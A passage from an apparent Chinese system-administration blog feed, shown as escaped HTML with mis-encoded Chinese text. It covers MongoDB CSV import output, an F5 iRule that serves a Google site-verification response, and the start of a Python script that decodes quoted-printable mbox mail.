&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;service mongod start  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯¼å…¥æµ·é‡æ•°æ®ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;root@ovs-16-11-2 ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# mongoimport -d mydb -c prj01 --type csv --file opendata_projects.csv --headerline&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;connected to: 127.0.0.1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:50:47.002         Progress: 39118658/470754183    8%  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:50:47.002             &lt;span class=&#34;m&#34;&gt;74400&lt;/span&gt;   24800/second  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:50:50.033         Progress: 80042213/470754183    17%  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:50:50.033             &lt;span class=&#34;m&#34;&gt;150700&lt;/span&gt;  25116/second  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:50:53.145         Progress: 108143323/470754183   22%  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:50:53.145             &lt;span class=&#34;m&#34;&gt;202700&lt;/span&gt;  22522/second  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:50:56.004         Progress: 149781879/470754183   31%  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:50:56.004             &lt;span class=&#34;m&#34;&gt;280000&lt;/span&gt;  23333/second  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:50:59.001         Progress: 179705162/470754183   38%  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:50:59.001             &lt;span class=&#34;m&#34;&gt;336200&lt;/span&gt;  22413/second  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:51:03.385         Progress: 212197023/470754183   45%  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:51:03.385             &lt;span class=&#34;m&#34;&gt;396400&lt;/span&gt;  20863/second  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:51:06.015         Progress: 236552399/470754183   50%  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:51:06.015             &lt;span class=&#34;m&#34;&gt;441700&lt;/span&gt;  20077/second  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:51:09.299         Progress: 264365847/470754183   56%  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:51:09.299             &lt;span class=&#34;m&#34;&gt;493300&lt;/span&gt;  19732/second  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:51:12.001         Progress: 304790148/470754183   64%  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:51:12.001             &lt;span class=&#34;m&#34;&gt;568500&lt;/span&gt;  20303/second  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:51:15.033         Progress: 323508057/470754183   68%  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:51:15.033             &lt;span class=&#34;m&#34;&gt;603300&lt;/span&gt;  19461/second  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:51:18.607         Progress: 361610334/470754183   76%  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:51:18.607             &lt;span class=&#34;m&#34;&gt;674200&lt;/span&gt;  19829/second  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:51:21.000         Progress: 393748962/470754183   83%  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:51:21.000             &lt;span class=&#34;m&#34;&gt;733700&lt;/span&gt;  19829/second  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:51:24.007         Progress: 427667505/470754183   90%  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:51:24.007             &lt;span class=&#34;m&#34;&gt;796900&lt;/span&gt;  19922/second  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:51:27.001         Progress: 459658299/470754183   97%  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:51:27.001             &lt;span class=&#34;m&#34;&gt;857300&lt;/span&gt;  19937/second  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:51:27.793 check &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;878853&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jul &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 09:51:27.979 imported &lt;span class=&#34;m&#34;&gt;878852&lt;/span&gt; objects  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿›å…¥å‘½ä»¤è¡Œï¼Œçœ‹çœ‹åº“çš„æ•´ä½“æƒ…å†µï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>F5 iruleä¹‹googleç«™é•¿è®¤è¯åˆ«æ ·ç”¨æ³•</title>
      <link>https://rendoumi.com/posts/20240118-f5_irule/</link>
      <pubDate>Thu, 18 Jan 2024 17:07:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240118-f5_irule/</guid>
      <description>&lt;p&gt;å…¬å¸çš„ç½‘ç«™è¦è¿‡googleè®¤è¯ï¼Œéœ€è¦åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹æ”¾ä¸€ä¸ªæ–‡ä»¶ï¼Œgoogleb1e6d9a50ea8xxxx.html&lt;/p&gt;
&lt;p&gt;å†…å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;google-site-verification: googleb1e6d9a50ea8xxxx.html  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™ä¸ªæ— æ¯”ç®€å•ï¼Œæ€ä¹ˆåˆè·ŸF5å’Œiruleæ‰¯ä¸Šå…³ç³»äº†å‘¢ï¼Ÿï¼&lt;/p&gt;
&lt;p&gt;å“ï¼Œå› ä¸ºå±…ç„¶è¦åšä¸¤ä¸ªåŸŸåï¼Œm.xxx.comå’Œh.xxx.comï¼Œè¿™ä¸¤ä¸ªåŸŸåéƒ½è¦è¿‡è®¤è¯ï¼Œè€Œä¸”æ‚²å‰§çš„æ˜¯ï¼Œè¿™ä¸¤ä¸ªåŸŸåå®é™…ä»£ç†çš„æ˜¯åŒä¸€å°åç«¯æœåŠ¡å™¨çš„åŒä¸€ä¸ªtomcatè¿›ç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;é‰´äºè¿™ä¸ªä¸œè¥¿è¿™ä¹ˆç®€å•ï¼Œå¹²è„†åœ¨F5ä¸Šæ¥ä¸€æ®µiruleè§£å†³é—®é¢˜ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;when HTTP_REQUEST &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;([&lt;/span&gt;string tolower &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HTTP::path&lt;span class=&#34;o&#34;&gt;]]&lt;/span&gt; starts_with &lt;span class=&#34;s2&#34;&gt;&amp;#34;/googleb1e6d9a50ea8xxxx.html&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;([&lt;/span&gt;string tolower &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HTTP::host&lt;span class=&#34;o&#34;&gt;]]&lt;/span&gt; equals &lt;span class=&#34;s2&#34;&gt;&amp;#34;m.xxx.com&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  HTTP::respond &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; content &lt;span class=&#34;s2&#34;&gt;&amp;#34;google-site-verification: googleb1e6d9a50ea8xxxx.html&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç”±äºæ²¡æœ‰å¤ç”¨ipï¼Œæ‰€ä»¥åœ¨h.xxx.comåŒæ ·ä¿®æ”¹ä»¥ä¸Šè„šæœ¬å¹¶åº”ç”¨å³å¯ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœæ˜¯ç©·å…‰è›‹ä½œé£ï¼Œåœ¨F5ä¸Šå¤ç”¨äº†IPåšäº†è™šæ‹Ÿä¸»æœºè½¬å‘ï¼Œä¹Ÿä¿®æ”¹ä¿®æ”¹è„šæœ¬å³å¯ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>mboxæ–‡ä»¶ä¸­çš„=3Dæ˜¯ä»€ä¹ˆé¬¼(quoted-printableç¼–ç )</title>
      <link>https://rendoumi.com/posts/20240118-mbox_3d/</link>
      <pubDate>Thu, 18 Jan 2024 17:06:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240118-mbox_3d/</guid>
      <description>&lt;p&gt;æœ€è¿‘åœ¨æé‚®å±€ã€‚æœ‰ä¸ªå¾ˆå¥‡æ€ªçš„é—®é¢˜ï¼Œå°±æ˜¯æ‰“å¼€mboxçš„æ–‡ä»¶ï¼Œæ¯”å¦‚è¯´ï¼š&lt;/p&gt;
&lt;p&gt;/var/spool/mail/root&lt;/p&gt;
&lt;p&gt;é‡Œé¢ä¿¡ä»¶çš„éƒ¨åˆ†æœ‰å¥‡æ€ªçš„3Då­—ç¬¦ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;table &lt;span class=&#34;nv&#34;&gt;cellpadding&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;3D&lt;span class=&#34;s2&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;cellspacing&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;3D&lt;span class=&#34;s2&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;3D&lt;span class=&#34;s2&#34;&gt;&amp;#34;text-align:le=  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;ft;color:#454545;background-color:#fff;font-size:14px;border-radius:10px;pa=  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ï¼Œä¸­é—´å¤šäº†è‹¥å¹²ä¸ª3Dï¼Œæœ€åä¹Ÿå¤šäº†=å·&lt;/p&gt;
&lt;p&gt;è¿™æ˜¯ä»€ä¹ˆé¬¼å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;æœäº†ä¸€åœˆï¼ŒåŸæ¥è¿™æ˜¯quoted-printableç¼–è§£ç ï¼Œè·ŸBase64ç±»ä¼¼ï¼Œbase64å’Œquoted-printableè¿™ä¸¤ç§ç¼–ç éƒ½æ˜¯åœ¨ç”µå­é‚®ä»¶ä¸­å¸¸è§çš„ç¼–ç æ–¹å¼ã€‚&lt;/p&gt;
&lt;p&gt;åŸºæœ¬çŸ¥è¯†ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å¦‚æœ=å·å‡ºç°åœ¨ä¸€è¡Œæœ€åï¼Œè¡¨ç¤ºæ¢è¡Œï¼Œé‚£ä¹ˆï¼š
he=
llo
æ„æ€å°±æ˜¯è¿èµ·æ¥çš„hello&lt;/li&gt;
&lt;li&gt;å¦‚æœä¸­é—´å‡ºç°=3Dï¼Œé‚£å°±æ˜¯ä¸€ä¸ª=å·çš„æ„æ€
æ‰€ä»¥style=3D&amp;quot;text&amp;quot;æ„æ€å°±æ˜¯style=&amp;ldquo;text&amp;rdquo;&lt;/li&gt;
&lt;li&gt;è‹±æ–‡å­—ç¬¦é™¤äº†=ä»¥å¤–ä¸åšå¤„ç†ï¼Œå…¶ä»–å­—ç¬¦çš„ç¼–ç ä¸º=åŠ è¿™ä¸ªå­—ç¬¦çš„ä¸¤ä¸ªå­—èŠ‚çš„16è¿›åˆ¶æ•°ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å¼„æ˜ç™½äº†å§ã€‚&lt;/p&gt;
&lt;p&gt;ç»™ä¸€æ®µå¤„ç†mboxçš„pythonç¨‹åºï¼Œå¯ä»¥ç”¨æ¥è¯»é‚®ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/usr/bin/env python
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import mailbox  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import base64  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import os  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import sys  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import email
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import quopri
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;filename&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/var/spool/mail/zrr&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;mb&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; mailbox.mbox&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;filename&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;nmes&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; len&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;mb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; i in range&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;len&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;mb&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;:  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        print &lt;span class=&#34;s2&#34;&gt;&amp;#34;\n\n\n\n\n&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        print &lt;span class=&#34;s2&#34;&gt;&amp;#34;-------------------------------------------------------------------------------------------------&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    print &lt;span class=&#34;s2&#34;&gt;&amp;#34;Email&amp;#34;&lt;/span&gt;, i
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        print &lt;span class=&#34;s2&#34;&gt;&amp;#34;-------------------------------------------------------------------------------------------------&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;mes&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; mb.get_message&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;em&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; email.message_from_string&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;mes.as_string&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;subject&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; em.get&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Subject&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; subject.find&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;=?&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; !&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; -1:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;ll&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; email.header.decode_header&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;subject&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;subject&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; l in ll:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nv&#34;&gt;subject&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; subject + l&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;em_from&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; em.get&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;From&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; em_from.find&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;=?&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; !&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; -1:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;ll&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; email.header.decode_header&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;em_from&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;em_from&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; l in ll:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nv&#34;&gt;em_from&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; em_from + l&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
